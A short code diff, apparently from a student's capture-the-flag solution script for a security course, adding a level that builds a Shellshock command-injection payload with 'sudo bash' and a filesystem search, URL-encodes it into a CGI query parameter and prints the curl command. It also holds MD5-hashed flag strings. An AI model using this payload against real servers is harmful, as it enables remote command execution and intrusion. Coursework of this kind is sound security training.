@@ -35,6 +35,16 @@ def level05():
     secret='wel0vesecurity'
     print(hashlib.md5(secret.encode('utf-8')).hexdigest())
 
+def level06():
+    curl='curl -v -H "Referer: http://pwnthemall.cse543.rev.fish:8082/users.html" http://pwnthemall.cse543.rev.fish:8082/cgi-bin/users.php?filter='
+    shellshock='() { :;}; echo; sudo bash; '    
+    find='find / -type f 2>&1  | grep -v "Permission denied" | grep ".php" '    
+    # find='find / -type f 2>&1 | grep -v "Permission denied" | xargs grep twebst10 '    
+    command=urllib.parse.quote(shellshock + find, safe='')
+    curl = curl + command
+    print(curl)
 
+    # secret='allyourbasebelongtous'
+    # print(hashlib.md5(secret.encode('utf-8')).hexdigest())
 
-level05()
+level06()
